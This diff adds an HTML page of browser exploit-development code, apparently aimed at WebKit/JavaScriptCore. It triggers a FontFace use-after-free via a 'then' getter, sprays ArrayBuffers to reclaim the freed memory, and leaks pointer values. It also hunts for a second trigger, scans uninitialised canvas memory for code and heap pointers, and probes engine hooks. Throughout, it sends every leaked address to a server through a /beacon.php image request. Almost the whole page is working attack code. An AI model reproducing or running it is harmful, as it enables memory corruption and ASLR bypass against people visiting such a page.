@@ -1,0 +1,518 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p1103</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:12px/1.5 monospace;padding:12px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.hit{color:#ff6;font-weight:bold}
+.ptr{color:#f6f;font-weight:bold}
+.fail{color:#f66}
+.ok{color:#6f6}
+.info{color:#6cf}
+.crit{color:#f00;font-weight:bold;font-size:13px}
+.win{color:#0f0;font-weight:bold;font-size:14px}
+.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}
+</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex(v){return'0x'+v.toString(16);}
+
+B('P1103-BOOT','');
+log('phase','P1103: Second primitive hunt — 4 attack vectors');
+
+// ============================================================
+// PART A: Alternative FontFace UAF triggers
+// Can we fire a SECOND UAF through a different Promise path?
+// ============================================================
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+var uaf1Done=false,uaf1Buf=null,uaf1Ptrs=null;
+
+// First UAF — proven trigger
+var styleEl=document.createElement('style');
+styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(styleEl);
+var f0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(f0);
+void f0.loaded;
+
+var firedHere=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(firedHere)return undefined;
+    firedHere=true;
+    if(styleEl)styleEl.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    var map=[];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      for(var k=0;k<K;k++){
+        var ab=new ArrayBuffer(sz);
+        map.push({size:sz,ab:ab,idx:si*K+k});
+      }
+    }
+    try{document.fonts.check('1em s0');}catch(e){}
+    // Scan for reclaim
+    if(typeof BigUint64Array!=='undefined'){
+      for(var bi=32;bi<40;bi++){
+        if(!map[bi])continue;
+        var b=new BigUint64Array(map[bi].ab);
+        var nz=0;for(var qi=0;qi<b.length;qi++)if(b[qi]!==0n)nz++;
+        if(nz>0){
+          uaf1Done=true;
+          uaf1Buf=b;
+          uaf1Ptrs=[];
+          for(var qi=0;qi<b.length;qi++)if(b[qi]!==0n)uaf1Ptrs.push({off:qi*8,val:b[qi]});
+          b[0]=0x100n;
+          var ps=uaf1Ptrs.map(function(p){return'+'+hex(p.off)+'='+hex(p.val);}).join(',');
+          B('P1103-UAF1','buf='+bi+'|'+ps);
+          break;
+        }
+      }
+    }
+    return undefined;
+  },
+  set:function(){}
+});
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+// Deferred: wait for UAF1, then test alternative triggers
+setTimeout(function(){
+  if(!uaf1Done){
+    // Late scan
+    B('P1103-NOHIT','uaf1 failed');
+    return;
+  }
+
+  log('ok','UAF1 stable. Testing alternative second triggers...');
+  var ps=uaf1Ptrs.map(function(p){return hex(p.off)+'='+hex(p.val);}).join(', ');
+  log('ptr','Leaked: '+ps);
+
+  // ---- Trigger method A: FontFace.loaded Promise ----
+  log('','');
+  log('phase','[A] FontFace.loaded Promise resolution');
+
+  var fired_a=false,hit_a=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fired_a)return undefined;
+      fired_a=true;
+      log('crit','[A] .then getter FIRED via FontFace.loaded!');
+      B('P1103-TRIG-A','fired');
+      hit_a=true;
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  // Create fresh font and access .loaded
+  var ffA=new FontFace('trigA','local(Arial)',{unicodeRange:'U+0043'});
+  try{
+    // .loaded should be a Promise that resolves with the FontFace
+    var pA=ffA.loaded;
+    if(pA&&typeof pA.then==='function'){
+      log('info','[A] ffA.loaded is thenable');
+    }
+    // Also try explicit load
+    ffA.load();
+  }catch(e){log('fail','[A] Error: '+e.message);}
+
+  // ---- Trigger method B: FontFaceSet.ready ----
+  setTimeout(function(){
+    log('','');
+    log('phase','[B] FontFaceSet.ready Promise');
+
+    var fired_b=false,hit_b=false;
+    // FontFaceSet.ready resolves with the FontFaceSet, not a FontFace
+    // Override FontFaceSet.prototype.then instead
+    var ffsProto=null;
+    try{
+      ffsProto=Object.getPrototypeOf(document.fonts);
+    }catch(e){}
+
+    if(ffsProto){
+      try{
+        Object.defineProperty(ffsProto,'then',{
+          configurable:true,
+          get:function(){
+            if(fired_b)return undefined;
+            fired_b=true;
+            log('crit','[B] FontFaceSet.then getter FIRED!');
+            B('P1103-TRIG-B','fired');
+            hit_b=true;
+            return undefined;
+          },
+          set:function(){}
+        });
+        // Access .ready
+        var ready=document.fonts.ready;
+        log('info','[B] document.fonts.ready accessed');
+      }catch(e){log('fail','[B] Error: '+e.message);}
+    }else{
+      log('fail','[B] Cannot get FontFaceSet prototype');
+    }
+
+    // ---- Trigger method C: Manual FontFace().load().then() ----
+    setTimeout(function(){
+      log('','');
+      log('phase','[C] Manual ff.load() Promise chain');
+
+      var fired_c=false,hit_c=false;
+      Object.defineProperty(FontFace.prototype,'then',{
+        configurable:true,
+        get:function(){
+          if(fired_c)return undefined;
+          fired_c=true;
+          log('crit','[C] .then getter FIRED via ff.load()!');
+          B('P1103-TRIG-C','fired');
+          hit_c=true;
+          return undefined;
+        },
+        set:function(){}
+      });
+
+      try{
+        var ffC=new FontFace('trigC','local(Courier)',{unicodeRange:'U+0044'});
+        var loadPromise=ffC.load();
+        // loadPromise should resolve with ffC
+        // The resolution checks ffC.then
+        log('info','[C] ffC.load() called, promise pending');
+      }catch(e){log('fail','[C] Error: '+e.message);}
+
+      // ---- Trigger method D: fonts.load with totally fresh fonts ----
+      setTimeout(function(){
+        log('','');
+        log('phase','[D] Fresh document.fonts.load() after clearing all');
+
+        var fired_d=false,hit_d=false;
+        // Remove all fonts, re-add fresh
+        try{document.fonts.clear();}catch(e){}
+
+        Object.defineProperty(FontFace.prototype,'then',{
+          configurable:true,
+          get:function(){
+            if(fired_d)return undefined;
+            fired_d=true;
+            log('crit','[D] .then getter FIRED via fresh fonts.load!');
+            B('P1103-TRIG-D','fired');
+            hit_d=true;
+            return undefined;
+          },
+          set:function(){}
+        });
+
+        var styleD=document.createElement('style');
+        styleD.textContent="@font-face{font-family:freshD;src:local(Times);unicode-range:U+0045;}";
+        document.head.appendChild(styleD);
+        var ffD=new FontFace('ffD','local(Helvetica)',{unicodeRange:'U+0045'});
+        document.fonts.add(ffD);
+        void ffD.loaded;
+
+        try{
+          document.fonts.load('1em ffD, freshD','EE').then(function(){
+            log('info','[D] fonts.load resolved');
+          },function(){
+            log('info','[D] fonts.load rejected');
+          });
+        }catch(e){log('fail','[D] Error: '+e.message);}
+
+        // Wait and report trigger results
+        setTimeout(function(){
+          B('P1103-TRIGGERS','A='+hit_a+'|B='+hit_b+'|C='+hit_c+'|D='+hit_d);
+          log('','');
+          log('phase','Trigger results: A='+hit_a+' B='+hit_b+' C='+hit_c+' D='+hit_d);
+
+          // ============================================================
+          // PART B: Canvas uninit memory code pointer scan
+          // Read canvas pixel data for code-range pointers
+          // ============================================================
+          log('','');
+          log('phase','[PART B] Canvas uninit memory scan for code pointers');
+
+          try{
+            var canvas=document.createElement('canvas');
+            canvas.width=1024;canvas.height=4;
+            var ctx=canvas.getContext('2d');
+
+            // Don't clear — try to read uninitialized memory
+            // Draw a tiny mark so getImageData works
+            ctx.fillStyle='rgba(0,0,0,0)';
+            ctx.fillRect(0,0,1,1);
+
+            var imgData=ctx.getImageData(0,0,1024,4);
+            var pix=imgData.data;
+            var totalBytes=pix.length;
+
+            // Scan for non-zero and pointer-shaped values
+            var nonZero=0,heapPtrs=[],codePtrs=[];
+            var view=new DataView(pix.buffer);
+
+            for(var i=0;i<totalBytes-7;i+=8){
+              var lo=view.getUint32(i,true);
+              var hi=view.getUint32(i+4,true);
+              if(lo!==0||hi!==0)nonZero++;
+
+              // Heap pointer: 0x0000001xxxxxxxxx
+              if(hi>=0x00000008&&hi<=0x00000020&&lo!==0){
+                heapPtrs.push({off:i,hi:hi,lo:lo});
+              }
+              // Code pointer: 0x00000001-0x00000007 range
+              if(hi>=0x00000001&&hi<=0x00000007&&lo!==0&&lo!==0xafafafaf){
+                codePtrs.push({off:i,hi:hi,lo:lo});
+              }
+            }
+
+            log('info','Canvas '+totalBytes+'B scanned: '+nonZero+' non-zero qwords');
+            log('info','Heap-range ptrs: '+heapPtrs.length+', Code-range ptrs: '+codePtrs.length);
+
+            if(codePtrs.length>0){
+              log('crit','CODE POINTERS FOUND!');
+              var cs=codePtrs.slice(0,10).map(function(p){
+                return '@'+p.off+':0x'+p.hi.toString(16)+p.lo.toString(16).padStart(8,'0');
+              }).join(',');
+              log('ptr',cs);
+              B('P1103-CODE-PTRS','count='+codePtrs.length+'|'+cs);
+            }
+            if(heapPtrs.length>0){
+              var hs=heapPtrs.slice(0,10).map(function(p){
+                return '@'+p.off+':0x'+p.hi.toString(16)+p.lo.toString(16).padStart(8,'0');
+              }).join(',');
+              log('ptr','Heap: '+hs);
+              B('P1103-HEAP-PTRS','count='+heapPtrs.length+'|'+hs);
+            }
+            if(codePtrs.length===0&&heapPtrs.length===0){
+              B('P1103-CANVAS-CLEAN','nz='+nonZero+'/'+Math.floor(totalBytes/8));
+            }
+
+            // Second read: create LARGE canvas after GC pressure
+            var garbage=[];
+            for(var g=0;g<2000;g++)garbage.push(new ArrayBuffer(4096));
+            garbage=null;
+
+            var c2=document.createElement('canvas');
+            c2.width=2048;c2.height=4;
+            var ctx2=c2.getContext('2d');
+            ctx2.fillStyle='rgba(0,0,0,0)';
+            ctx2.fillRect(0,0,1,1);
+            var img2=ctx2.getImageData(0,0,2048,4);
+            var pix2=img2.data;
+            var view2=new DataView(pix2.buffer);
+            var nz2=0,hp2=[],cp2=[];
+
+            for(var i=0;i<pix2.length-7;i+=8){
+              var lo2=view2.getUint32(i,true);
+              var hi2=view2.getUint32(i+4,true);
+              if(lo2!==0||hi2!==0)nz2++;
+              if(hi2>=0x00000008&&hi2<=0x00000020&&lo2!==0)hp2.push({off:i,hi:hi2,lo:lo2});
+              if(hi2>=0x00000001&&hi2<=0x00000007&&lo2!==0&&lo2!==0xafafafaf)cp2.push({off:i,hi:hi2,lo:lo2});
+            }
+
+            log('info','Canvas2 '+pix2.length+'B: nz='+nz2+', heap='+hp2.length+', code='+cp2.length);
+            if(cp2.length>0){
+              log('crit','CANVAS2 CODE POINTERS!');
+              var cs2=cp2.slice(0,10).map(function(p){
+                return '@'+p.off+':0x'+p.hi.toString(16)+p.lo.toString(16).padStart(8,'0');
+              }).join(',');
+              B('P1103-CODE2','count='+cp2.length+'|'+cs2);
+            }else{
+              B('P1103-CANVAS2','nz='+nz2+'|heap='+hp2.length+'|code=0');
+            }
+          }catch(e){
+            log('fail','Canvas error: '+e.message);
+            B('P1103-CANVAS-ERR',e.message);
+          }
+
+          // ============================================================
+          // PART C: WeakRef / FinalizationRegistry detection
+          // ============================================================
+          log('','');
+          log('phase','[PART C] WeakRef/FinalizationRegistry API check');
+
+          var hasWeakRef=typeof WeakRef!=='undefined';
+          var hasFinReg=typeof FinalizationRegistry!=='undefined';
+          var hasWeakMap=typeof WeakMap!=='undefined';
+          var hasWeakSet=typeof WeakSet!=='undefined';
+
+          log('info','WeakRef: '+(hasWeakRef?'YES':'NO'));
+          log('info','FinalizationRegistry: '+(hasFinReg?'YES':'NO'));
+          log('info','WeakMap: '+(hasWeakMap?'YES':'NO'));
+          log('info','WeakSet: '+(hasWeakSet?'YES':'NO'));
+
+          var apiResults='WR='+hasWeakRef+'|FR='+hasFinReg+'|WM='+hasWeakMap+'|WS='+hasWeakSet;
+
+          // Test FinalizationRegistry if available
+          if(hasFinReg){
+            try{
+              var cleanupCalled=false;
+              var reg=new FinalizationRegistry(function(heldVal){
+                cleanupCalled=true;
+                log('crit','FinalizationRegistry cleanup! heldVal='+heldVal);
+                B('P1103-CLEANUP','val='+heldVal);
+              });
+              var target={test:true};
+              reg.register(target,'target-freed');
+              target=null; // release for GC
+
+              // Force GC
+              var gc=[];
+              for(var i=0;i<10000;i++)gc.push(new ArrayBuffer(1000));
+              gc=null;
+
+              setTimeout(function(){
+                log('info','FinReg cleanup called: '+cleanupCalled);
+                B('P1103-FINREG','cleanup='+cleanupCalled);
+              },500);
+            }catch(e){
+              log('fail','FinReg error: '+e.message);
+            }
+          }
+
+          // ============================================================
+          // PART D: Proxy-based engine interception
+          // ============================================================
+          log('','');
+          log('phase','[PART D] Proxy/Symbol API probing');
+
+          var hasProxy=typeof Proxy!=='undefined';
+          var hasSymbol=typeof Symbol!=='undefined';
+          var hasSymSpecies=hasSymbol&&typeof Symbol.species!=='undefined';
+          var hasSymToStr=hasSymbol&&typeof Symbol.toStringTag!=='undefined';
+          var hasSymIterator=hasSymbol&&typeof Symbol.iterator!=='undefined';
+          var hasSymHasInst=hasSymbol&&typeof Symbol.hasInstance!=='undefined';
+
+          log('info','Proxy: '+(hasProxy?'YES':'NO'));
+          log('info','Symbol: '+(hasSymbol?'YES':'NO'));
+          log('info','Symbol.species: '+(hasSymSpecies?'YES':'NO'));
+          log('info','Symbol.toStringTag: '+(hasSymToStr?'YES':'NO'));
+          log('info','Symbol.iterator: '+(hasSymIterator?'YES':'NO'));
+          log('info','Symbol.hasInstance: '+(hasSymHasInst?'YES':'NO'));
+
+          apiResults+='|Proxy='+hasProxy+'|Sym='+hasSymbol;
+
+          // Test if ArrayBuffer[Symbol.species] can be hijacked
+          if(hasSymSpecies){
+            try{
+              var origSpecies=ArrayBuffer[Symbol.species];
+              log('info','ArrayBuffer[Symbol.species]: '+(origSpecies?origSpecies.name||typeof origSpecies:'undefined'));
+
+              // Try overriding species to control buffer creation
+              var speciesHit=false;
+              try{
+                Object.defineProperty(ArrayBuffer,Symbol.species,{
+                  configurable:true,
+                  get:function(){
+                    speciesHit=true;
+                    log('crit','ArrayBuffer[Symbol.species] accessed!');
+                    return ArrayBuffer;
+                  }
+                });
+                // Trigger species check via slice
+                var testBuf=new ArrayBuffer(16);
+                var sliced=testBuf.slice(0,8);
+                log('info','Species hit on slice: '+speciesHit);
+              }catch(e){
+                log('info','Species override: '+e.message);
+              }
+            }catch(e){
+              log('info','Species check: '+e.message);
+            }
+          }
+
+          // Test Proxy around ArrayBuffer
+          if(hasProxy){
+            try{
+              var proxyAccess=[];
+              var testAB=new ArrayBuffer(32);
+              var px=new Proxy(testAB,{
+                get:function(t,p){
+                  if(typeof p==='string'&&p!=='then')proxyAccess.push('get:'+p);
+                  return t[p];
+                },
+                set:function(t,p,v){
+                  proxyAccess.push('set:'+p);
+                  t[p]=v;
+                  return true;
+                }
+              });
+
+              // Try passing proxy to APIs that might inspect it
+              try{var v=new Uint8Array(px);}catch(e){proxyAccess.push('U8:'+e.message.substring(0,30));}
+              try{var v2=px.slice(0,8);}catch(e){proxyAccess.push('slice:'+e.message.substring(0,30));}
+              try{structuredClone(px);}catch(e){proxyAccess.push('clone:'+e.message.substring(0,30));}
+
+              log('info','Proxy intercepted: '+proxyAccess.slice(0,15).join(', '));
+              B('P1103-PROXY',proxyAccess.slice(0,20).join('|'));
+            }catch(e){
+              log('fail','Proxy test: '+e.message);
+            }
+          }
+
+          B('P1103-APIS',apiResults);
+
+          // ============================================================
+          // PART E: JSC internal structure probing via valueOf/toString
+          // Can we get JSC to call our code during internal operations?
+          // ============================================================
+          log('','');
+          log('phase','[PART E] JSC internal callback hooks');
+
+          var callbacks=[];
+
+          // Override valueOf on Number.prototype
+          var origNumVal=Number.prototype.valueOf;
+          Number.prototype.valueOf=function(){
+            callbacks.push('num.valueOf');
+            return origNumVal.call(this);
+          };
+
+          // Test: does ArrayBuffer constructor call valueOf?
+          try{
+            var n={valueOf:function(){callbacks.push('obj.valueOf');return 192;}};
+            var ab3=new ArrayBuffer(n);
+            log('info','ArrayBuffer(valueOf obj): byteLength='+ab3.byteLength);
+          }catch(e){log('info','AB valueOf: '+e.message);}
+
+          // Test: does TypedArray constructor leak addresses?
+          try{
+            var ta=new BigUint64Array(4);
+            // Write a known pattern
+            ta[0]=0xAAAABBBBCCCCDDDDn;
+            // Check if the pattern survives in ways that leak the buffer address
+            var view3=new DataView(ta.buffer);
+            var lo3=view3.getUint32(0,true);
+            var hi3=view3.getUint32(4,true);
+            log('info','BigUint64 verify: 0x'+hi3.toString(16)+lo3.toString(16).padStart(8,'0'));
+          }catch(e){}
+
+          Number.prototype.valueOf=origNumVal; // restore
+
+          B('P1103-CALLBACKS',callbacks.join(','));
+
+          // ============================================================
+          // FINAL SUMMARY
+          // ============================================================
+          setTimeout(function(){
+            log('','');
+            log('phase','=== P1103 Summary ===');
+            log('win','UAF1: OK ('+uaf1Ptrs.length+' leaked values)');
+            log('info','Triggers: A='+hit_a+' B='+hit_b+' C='+hit_c+' D='+hit_d);
+            log('info','APIs: WeakRef='+hasWeakRef+' FinReg='+hasFinReg+' Proxy='+hasProxy);
+
+            var sum='uaf1=ok|A='+hit_a+'|B='+hit_b+'|C='+hit_c+'|D='+hit_d;
+            sum+='|WR='+hasWeakRef+'|FR='+hasFinReg+'|Proxy='+hasProxy;
+            B('P1103-DONE',sum);
+          },1000);
+        },1500);
+      },800);
+    },800);
+  },800);
+},600);
+</script>
+</body></html>
